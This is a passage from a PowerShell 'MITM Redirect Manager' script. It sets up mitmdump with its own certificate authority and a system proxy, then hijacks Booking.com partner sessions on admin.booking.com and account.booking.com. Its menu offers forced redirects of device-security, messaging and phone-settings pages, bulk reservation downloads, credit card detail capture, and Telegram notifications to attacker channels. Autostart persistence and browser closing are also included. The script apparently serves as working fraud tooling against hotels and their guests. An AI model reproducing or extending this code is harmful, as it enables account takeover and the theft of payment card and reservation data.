        Remove-Item -Path $_ -ErrorAction SilentlyContinue
    }
    
    Restore-Function26Flag -wasEnabled $function26WasEnabled
    
    Log-Write ("Function 24 (Pulse) enabled with target: {0}" -f $toDomain)
    Save-AutostartState -FunctionName "FUNCTION_24"
    
    Write-Host ""
    Write-Host "✅ Function 24 ACTIVATED" -ForegroundColor Green
    Write-Host "   Pulse redirect to: $toDomain"
    Write-Host "   🚨 Pulse will work until YOU disable it via menu option 4 or 1"
    Write-Host "   📡 After disabling: ALL account.booking.com -> admin.booking.com/hotel/hoteladmin/"
    Write-Host "   📨 Telegram notifications to channel 'pms'"
    Write-Host ""
    
    Start-Mitmdump
}

function Enable-UltraPulseRedirect {
    $function26WasEnabled = Preserve-Function26Flag
    
    Log-Write "Starting FUNCTION 25..."
    
    Remove-Item -Path $PulseDisabledFlag -Force -ErrorAction SilentlyContinue
    
    Write-Host ""
    Write-Host "=== FUNCTION 25: ULTRA PULSE ==="
    Write-Host ""
    Write-Host "[INFO] SEQUENCE: Function 23 (Device) -> Function 24 (Pulse)"
    Write-Host "       1. First phase: Device Security redirect"
    Write-Host "          (works until user gets auth_assurance_last_check parameter)"
    Write-Host "       2. Second phase: Pulse redirect"
    Write-Host "          (works until manually disabled via menu)"
    Write-Host "       Telegram logs to channel 'pms'"
    Write-Host ""
    Write-Host "📌 SEQUENCE STEPS:"
    Write-Host "   Step 1: User visits admin.booking.com -> redirected to devices.html"
    Write-Host "   Step 2: When device page has auth_assurance_last_check -> Phase 1 done"
    Write-Host "   Step 3: Pulse phase starts automatically"
    Write-Host ""
    Write-Host "🔧 AFTER DISABLING PULSE:"
    Write-Host "   ALL account.booking.com/* -> admin.booking.com/hotel/hoteladmin/"
    Write-Host "   Works even after mitmdump restart"
    Write-Host ""
    
    do {
        $toDomain = Read-Host "Enter FULL TO URL for Pulse phase (must start with http:// or https://)"
        if ($toDomain -notmatch '^https?://') {
            Write-Host "ERROR: URL must start with http:// or https://" -ForegroundColor Red
            continue
        }
        
        if ($toDomain -like "*admin.booking.com*") {
            Write-Host "WARNING: Target URL contains admin.booking.com" -ForegroundColor Yellow
            Write-Host "This might create redirect loops!" -ForegroundColor Red
            $confirm = Read-Host "Continue anyway? (y/n)"
            if ($confirm -ne 'y') {
                continue
            }
        }
        
        break
    } while ($true)
    
    Set-Content -Path $UltraPulseRedirectToFile -Value $toDomain.Trim() -Force
    
    if (-not (Test-Path (Split-Path $UltraPulseFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $UltraPulseFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $UltraPulseFlag -Force | Out-Null
    
    if (-not (Test-Path (Split-Path $DeviceFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $DeviceFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $DeviceFlag -Force | Out-Null
    
    @(
        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
        $BookingCCDetailsHotelIdFile,
        $PartnersFlag, $PartnersAndMessFlag, $PulseFlag,
        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
        $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
        $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
        # $MonitorPlatformsFlag - НЕ УДАЛЯЕМ!
    ) | ForEach-Object {
        Remove-Item -Path $_ -ErrorAction SilentlyContinue
    }
    
    Restore-Function26Flag -wasEnabled $function26WasEnabled
    
    Log-Write ("Function 25 (Ultra Pulse) enabled with Pulse target: {0}" -f $toDomain)
    Save-AutostartState -FunctionName "FUNCTION_25"
    
    Write-Host ""
    Write-Host "✅ Function 25 ACTIVATED" -ForegroundColor Green
    Write-Host "   Phase 1: Device Security (Function 23)"
    Write-Host "   Phase 2: Pulse redirect to: $toDomain"
    Write-Host "   🚨 Phase 2 works until disabled via menu option 4 or 1"
    Write-Host "   📡 After disabling: ALL account.booking.com -> admin.booking.com/hotel/hoteladmin/"
    Write-Host "   📨 Telegram notifications to channel 'pms'"
    Write-Host ""
    
    Start-Mitmdump
}

# ========== ФУНКЦИИ УПРАВЛЕНИЯ ==========

function Disable-AllRedirects {
    # ========== СОХРАНЯЕМ ФЛАГ ФУНКЦИИ 26 ==========
    $function26WasEnabled = Preserve-Function26Flag
    
    @(
        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
        $BookingCCDetailsHotelIdFile,
        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
        $UltraPulseRedirectToFile,
        $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
        $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
        # $MonitorPlatformsFlag - НЕ УДАЛЯЕМ!
    ) | ForEach-Object {
        Remove-Item -Path $_ -Force -ErrorAction SilentlyContinue
    }
    
    # ========== ВОССТАНАВЛИВАЕМ ФЛАГ ФУНКЦИИ 26 ЕСЛИ ОН БЫЛ ==========
    Restore-Function26Flag -wasEnabled $function26WasEnabled
    
    Set-Content -Path $PulseDisabledFlag -Value "DISABLED" -Force
    
    # Удаляем флаг автозапуска
    Remove-Item -Path $AutostartFlag -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $AutostartFunctionFile -Force -ErrorAction SilentlyContinue
    
    Clear-SystemProxies | Out-Null
    Reset-Proxy-And-Stop-Mitmdump
    Log-Write "All redirects disabled and proxy cleared."
    
    Write-Host ""
    Write-Host "⚠️  IMPORTANT:" -ForegroundColor Yellow
    if ($function26WasEnabled) {
        Write-Host "   ✅ FUNCTION 26 (MONITORING) IS STILL ACTIVE!" -ForegroundColor Green
        Write-Host "   🔍 Platform monitoring continues to work in parallel" -ForegroundColor Cyan
        Write-Host "   📨 Telegram notifications for platform access are still being sent" -ForegroundColor Cyan
    } else {
        Write-Host "   ❌ FUNCTION 26 (MONITORING) IS DISABLED" -ForegroundColor Red
        Write-Host "   Use option 26 to enable monitoring" -ForegroundColor Yellow
    }
    Write-Host ""
    Write-Host "   Function 24 (Pulse):" -ForegroundColor Yellow
    Write-Host "   ALL account.booking.com requests will redirect to admin.booking.com/hotel/hoteladmin/" -ForegroundColor Cyan
    Write-Host ""
}

# ========== MAIN ==========

Ensure-WorkDir
Log-Write "Manager starting."

Reset-Proxy-And-Stop-Mitmdump
Clear-SystemProxies

Ensure-MitmCA | Out-Null

# Проверяем, был ли автозапуск
$AutostartDetected = $false
if (Test-Path $AutostartFlag) {
    Log-Write "=" * 60
    Log-Write "🔄 AUTOSTART DETECTED - Restoring previous state"
    $AutostartDetected = $true
    
    if (Test-Path $AutostartFunctionFile) {
        $savedFunction = Get-Content $AutostartFunctionFile -Raw | ForEach-Object { $_.Trim() }
        Log-Write "🔄 Restoring function: $savedFunction"
    }
    Log-Write "=" * 60
    
    Write-Host ""
    Write-Host "🔄 AUTOSTART DETECTED" -ForegroundColor Cyan
    Write-Host "   Previous session detected. Do you want to:" -ForegroundColor Cyan
    Write-Host "   1) Continue with saved function" -ForegroundColor Green
    Write-Host "   2) Start fresh (disable autostart)" -ForegroundColor Yellow
    $autostartChoice = Read-Host "Choose option (1-2)"
    
    if ($autostartChoice -eq "2") {
        Remove-Item -Path $AutostartFlag -Force -ErrorAction SilentlyContinue
        Remove-Item -Path $AutostartFunctionFile -Force -ErrorAction SilentlyContinue
        Log-Write "Autostart cancelled by user - starting fresh"
        $AutostartDetected = $false
    }
}

if (-not $AutostartDetected) {
    do {
        $redirectURL = Read-Host "Enter redirect target URL (include https://) or press Enter for empty"
        
        if ([string]::IsNullOrWhiteSpace($redirectURL)) {
            Set-Content -Path $RedirectFile -Value "" -Force
            Log-Write ("[INFO] Redirect target set to EMPTY - only special functions will work")
            Write-Host ""
            Write-Host "[INFO] REDIRECT TARGET: EMPTY" 
            Write-Host "       Only special functions (7-27) will work" 
            Write-Host "       Force/One-shot redirects will be disabled" 
            Write-Host ""
            break
        }
        elseif ($redirectURL -match '^https?://') {
            Set-Content -Path $RedirectFile -Value $redirectURL -Force
            Log-Write ("Target URL saved to {0}" -f $RedirectFile)
            Write-Host ""
            Write-Host "[OK] Redirect target saved: $redirectURL" 
            Write-Host ""
            break
        } else {
            Write-Host "ERROR: Invalid URL format. Must start with http:// or https://" -ForegroundColor Red
            Write-Host "Example valid URLs:" 
            Write-Host "  https://www.example.com/" 
            Write-Host "  http://localhost:8080" 
            Write-Host "  https://admin.booking.com/hotel/" 
            Write-Host ""
            Write-Host "Or just press Enter to skip (only special functions will work)" -ForegroundColor Cyan
            Write-Host ""
        }
    } while ($true)
}

Write-Host "`nChoose browser closing option:"
Write-Host "1) Full close"
Write-Host "2) Graceful"
Write-Host "3) Don't close"
$closeChoice = Read-Host "Choose option (1-3)"

$closeOption = switch ($closeChoice) {
    "1" { "full" }
    "2" { "graceful" }
    "3" { "none" }
    default { "graceful" }
}

Close-Browsers-Gracefully -closeOption $closeOption

if ($AutostartDetected) {
    Log-Write "🔄 Autostart: Starting mitmdump with saved configuration"
    Start-Mitmdump
}

# ========== MAIN MENU ==========
while ($true) {
    Write-Host ""
    Write-Host "=========== MITM REDIRECT MANAGER ==========="
    Write-Host " BASIC:"
    Write-Host "   1) RESET (stop all)"
    Write-Host "   2) One-shot redirect"
    Write-Host "   3) Force redirect"
    Write-Host "   4) DISABLE all redirects (сохраняет функцию 26!)"
    Write-Host "   5) Tail log"
    Write-Host "   6) EXIT"
    Write-Host ""
    Write-Host " FUNCTIONS 1-20:"
    Write-Host "   7) Messaging redirect (function 7)"
    Write-Host "   8) Provider redirect (function 8)"
    Write-Host "   9) User redirect (function 9)"
    Write-Host "   10) Phone redirect (function 10)"
    Write-Host "   11) Operation 11 (7 -> 8)"
    Write-Host "   12) Operation 12 (9 -> 10)"
    Write-Host "   13) Phone settings force (function 13)"
    Write-Host "   14) Disable function 13"
    Write-Host "   15) Messages settings force (function 15)"
    Write-Host "   16) Operation 16 (13 -> 15)"
    Write-Host "   17) Custom one-time redirect (function 17)"
    Write-Host "   18) Reservations download (function 18)"
    Write-Host "   19) Credit card details (function 19)"
    Write-Host "   20) Clear Function 17"
    Write-Host ""
    Write-Host " FUNCTIONS 21-27:"
    Write-Host "   21) Partners redirect (booker)"
    Write-Host "   22) Partners and Messaging (booker)"
    Write-Host "   23) Device security (pms)"
    Write-Host "   24) Pulse redirect (pms)"
    Write-Host "   25) Ultra Pulse (pms)"
    Write-Host "   26) ✅ Platform monitoring ONLY (ПАРАЛЛЕЛЬНО - НЕ УДАЛЯЕТСЯ!)"
    Write-Host "   27) CYCLE Reservations download (BOOKER CHANNEL)"
    Write-Host "   28) Clear Function 27"
    Write-Host "==========================================="
    
    $monitorStatus = if (Test-Path $MonitorPlatformsFlag) { "✅ ACTIVE" } else { "❌ DISABLED" }
    Write-Host "📊 Function 26 status: $monitorStatus (работает параллельно)" -ForegroundColor Cyan
    Write-Host ""
    
    $opt = Read-Host "Enter option"

    switch ($opt) {
        "1" {
            Reset-Proxy-And-Stop-Mitmdump;
            Clear-SystemProxies | Out-Null;
            Log-Write "Full reset performed."
        }
        "2" { Enable-OneShotRedirect }
        "3" { Enable-ForceRedirect }
        "4" { Disable-AllRedirects }
        "5" {
            if (Test-Path $LogFile) {
                Get-Content -Path $LogFile -Tail 200 -Wait
            } else {
                Write-Host "Log not found."
            }
        }
        "6" { Safe-Exit }
        "7" { Enable-MessageRedirect }
        "8" { Enable-ProviderRedirect }
        "9" { Enable-UserRedirect }
        "10" { Enable-SecurityRedirect }
        "11" { Enable-Operation11Redirect }
        "12" { Enable-Operation12Redirect }
        "13" { Enable-BookingHotelRedirect }
        "14" { Disable-BookingHotelRedirect }
        "15" { Enable-BookingHotelSecurityRedirect }
        "16" { Enable-Operation16Redirect }
        "17" { Enable-CustomRedirect }
        "18" { Enable-BookingReservationsRedirect }
        "19" { Enable-BookingCCDetailsRedirect }
        "20" { Clear-Function17 }
        "21" { Enable-PartnersRedirect }
        "22" { Enable-PartnersAndMessRedirect }
        "23" { Enable-DeviceRedirect }
        "24" { Enable-PulseRedirect }
        "25" { Enable-UltraPulseRedirect }
        "26" { Enable-MonitorPlatforms }
        "27" { Enable-BookingReservationsCycleRedirect }
        "28" { Clear-Function27 }
        default { Write-Host "Invalid choice" }
    }
}